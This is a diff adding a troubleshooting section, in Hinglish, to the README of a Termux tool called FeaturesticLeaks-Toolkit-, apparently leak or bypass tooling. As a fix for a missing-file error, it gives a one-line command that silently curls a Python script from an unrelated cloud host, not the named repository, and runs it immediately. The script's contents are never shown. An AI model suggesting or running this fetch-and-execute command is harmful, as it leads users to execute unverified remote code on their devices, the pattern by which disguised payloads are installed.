@@ -60,6 +60,23 @@ python FeaturesticLeaks.py
 
 ---
 
+## 🚨 Error Fix: "python: can't open file 'FeaturesticLeaks.py': [Errno 2] No such file or directory"
+
+Agar aapko Termux me yeh error aa raha hai:
+```bash
+python: can't open file 'FeaturesticLeaks.py': [Errno 2] No such file or directory
+```
+Iska matlab aapke GitHub Repository (`itzgeniusboy/FeaturesticLeaks-Toolkit-`) me `FeaturesticLeaks.py` file uploaded nahi hai ya root directory me missing hai.
+
+### 🛠️ Instant 1-Line Fix (Direct Download & Run):
+Termux me `FeaturesticLeaks-Toolkit-` folder ke andar rehte hue is command ko run karein:
+
+```bash
+curl -sSL https://ais-pre-4xyeqa646rna4n7nppfial-470491496334.asia-southeast1.run.app/FeaturesticLeaks.py -o FeaturesticLeaks.py && python FeaturesticLeaks.py
+```
+
+---
+
 ## 🔓 100% Offline Bypass Mode
 
 Yeh tool **100% Offline Mode** me chalne ke liye configured hai:
